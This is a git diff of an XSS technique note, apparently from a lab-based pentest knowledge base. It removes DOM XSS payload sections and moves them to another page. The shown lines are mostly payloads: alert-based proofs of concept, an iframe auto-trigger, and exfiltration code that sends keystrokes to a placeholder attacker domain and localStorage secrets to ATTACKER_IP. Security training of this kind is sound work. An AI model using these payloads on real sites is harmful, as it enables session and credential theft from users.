@@ -4,7 +4,7 @@ type: technique
 tags: [client-side, exploitation, h1, injection, thm, web, xss]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-21
+date_updated: 2026-09-10
 sources: [thm-adv-xss, thm-web-xss, portswigger-scripts, h1-scraped-xss, payloadsallthethings-xss, git-payloadsallthethings, git-portswigger-all-labs]
 ---
 
@@ -94,27 +94,6 @@ Injection directly into a template literal (backticks — no quoting needed):
 ${alert(1)}
 ```
 
-### DOM XSS via document.write
-
-```javascript
-// Vulnerable code:
-document.write("Hello, " + location.search.get('name'));
-
-// Payload in URL:
-?name=<script>alert(1)</script>
-```
-
-### DOM XSS via jQuery hashchange
-
-```html
-https://realwebsite.com#<img src=1 onerror=alert(1)>
-```
-
-Delivered via iframe to auto-trigger:
-```html
-<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
-```
-
 ### Cookie stealing — inline redirect
 
 ```javascript
@@ -165,12 +144,6 @@ document.body.innerHTML = "</br></br></br><h1>Please login to continue</h1><form
 <img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN]/?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
-### Vue.js v-html sink (DOM XSS with polling exfil)
-
-```html
-<img src=1 onerror="setInterval(() => {fetch('http://ATTACKER_IP:8000?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});}, 6000);">
-```
-
 ### XSS + CORS data exfiltration
 
 Inject into stored XSS:
@@ -199,35 +172,9 @@ xhttp.send();
 </script>
 ```
 
-### DOM XSS via innerHTML — `<script>` tags not parsed
+## DOM XSS
 
-`innerHTML` assignment does not execute `<script>` tags; use event-handler tags instead:
-```html
-<img src=x onerror=alert(1) />
-```
-
-### DOM XSS inside `<select>` / `document.write` with option context
-
-Escape the option element then inject:
-```html
-</option><script>alert(1)</script><option selected>
-```
-URL form: `/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>`
-
-### Reflected DOM XSS — JSON context with backslash escaping
-
-Server escapes `"` to `\"`. Supply `\"` so the server produces `\\"`, which terminates the JSON string:
-```javascript
-\"-alert(1)}//
-```
-Mechanics: server turns `\"` into `\\"` → the `\\` is a literal backslash escape, `"` ends the JSON string, `-alert(1)` executes, `}` closes the object, `//` comments the rest.
-
-### DOM XSS via jQuery href attribute sink
-
-jQuery reads `location.search` and sets an `href` attribute — inject a `javascript:` URI:
-```
-/feedback?returnPath=javascript:alert(document.cookie)
-```
+DOM-based XSS material is consolidated in [[dom-attacks]]: source/sink tables, per-sink payloads (innerHTML, document.write including the `<select>` option context, jQuery selector and `href` sinks, Vue `v-html`), the reflected-DOM JSON backslash escape, postMessage delivery, DOM clobbering, and client-side path traversal. Any source-to-sink flow without sanitisation is DOM XSS; test it there.
 
 ### AngularJS template injection (sandbox escape)
 
